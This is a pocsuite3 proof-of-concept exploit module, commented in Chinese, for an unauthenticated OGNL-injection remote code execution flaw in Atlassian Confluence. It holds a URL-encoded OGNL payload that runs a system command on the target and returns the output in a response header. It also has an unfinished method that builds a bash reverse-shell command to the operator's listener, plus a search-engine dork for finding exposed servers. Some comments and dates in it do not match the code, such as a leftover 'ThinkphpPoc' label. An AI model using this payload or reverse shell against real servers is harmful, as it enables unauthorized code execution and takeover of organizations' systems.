import urllib

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, get_listener_ip, get_listener_port, \
    VUL_TYPE, REVERSE_PAYLOAD
from pocsuite3.lib.core.enums import OS_ARCH, OS
from pocsuite3.lib.utils import random_str, generate_shellcode_list


class ConfluenceRce(POCBase):
    # dork_fofa = 'app="ATLASSIAN-Confluence"'
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://www.exploit-db.com/"]  # 漏洞地址来源,0day不用写
    name = "ATLASSIAN-Confluence 远程代码执行 PoC"  # PoC 名称
    appPowerLink = "https://www.atlassian.com/"  # 漏洞厂商主页地址
    appName = "ATLASSIAN-Confluence"  # 漏洞应用名称
    appVersion = "Atlassian Confluence < 7.18.1"  # 漏洞影响版本
    vulType = VUL_TYPE.CODE_EXECUTION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """利用影响 Atlassian Confluence 产品 7.18.1 及更低版本的远程代码执行漏洞的脚本 PoC。OGNL 注入漏洞允许未经身份验证的用户在 Confluence 服务器或数据中心实例上执行任意代码。"""  # 漏洞简要描述

    pocDesc = """%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D"""  # POC用法描述

    def _check(self):
        vul_lst = []
        self.path = "%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/"
        full_url = f"{self.url}/{self.path}"
        cookies = {"JSESSIONID": "D1D5C19254931F6F4887AAC089331C33"}
        headers = {"Cache-Control": "max-age=0",
                   "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\", \"Google Chrome\";v=\"108\"",
                   "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1",
                   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                   "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1",
                   "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate",
                   "Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8", "Connection": "close"}
        try:
            response = requests.post(full_url, headers=headers, cookies=cookies, verify=False, timeout=5,
                                     allow_redirects=False)
            cmd_res = response.headers.get("X-Cmd-Response")
            if response.status_code == 302 and cmd_res:
                vul_lst.append(self.url)
        except Exception as e:
            print(e)
        finally:
            return vul_lst

    def _verify(self):
        result = {}
        vul_lst = self._check()
        if vul_lst:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Path'] = self.path

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def _shell(self):
        """
        shell模式下，只能运行单个PoC脚本，控制台会进入shell交互模式执行命令及输出
        """
        # 反弹shell的命令
        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
        # print(cmd)
        # 因为特殊字符的原因进行cmd的url编码
        #cmd_byte = cmd.encode('utf-8')
        #url_cmd = urllib.parse.quote(cmd_byte)
        # print(url_cmd)

        pass

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

# 注册 ThinkphpPoc 类
register_poc(ConfluenceRce)